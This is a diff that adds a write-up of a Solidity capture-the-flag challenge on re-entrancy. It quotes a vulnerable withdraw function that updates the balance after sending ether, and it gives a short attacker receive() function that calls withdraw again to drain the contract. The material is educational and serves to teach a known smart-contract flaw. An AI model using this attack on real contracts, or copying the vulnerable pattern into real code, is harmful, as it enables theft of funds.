@@ -207,6 +207,38 @@ We can create a contract that reverts when it receives some ether. So, when `tra
 
 ## 10 - Re-entrancy
 
+The goal of this challenge is to empty the contract ether.
+
+```solidity
+function withdraw(uint256 _amount) public {
+  if (balances[msg.sender] >= _amount) {
+    (bool result, ) = msg.sender.call{ value: _amount }("");
+    if (result) {
+      _amount;
+    }
+    balances[msg.sender] -= _amount;
+  }
+}
+
+```
+
+But it is vulnerable to a [Re-entrancy attack](https://solidity-by-example.org/hacks/re-entrancy/).
+
+The balance of the contract is updated after the ether is sent, and there is no safeguard.
+
+We can create a contract with a `receive` function that calls `withdraw` again, and it will bypass the requirement.
+
+```solidity
+receive() external payable {
+  reentrance.withdraw(msg.value);
+}
+
+```
+
+So, the ether is withdrawn twice and the balance is updated
+
+[Script](./scripts/10-Reentrance.ts) | [Test](./test/10-Reentrance.spec.ts)
+
 ## 11 - Elevator
 
 ## 12 - Privacy
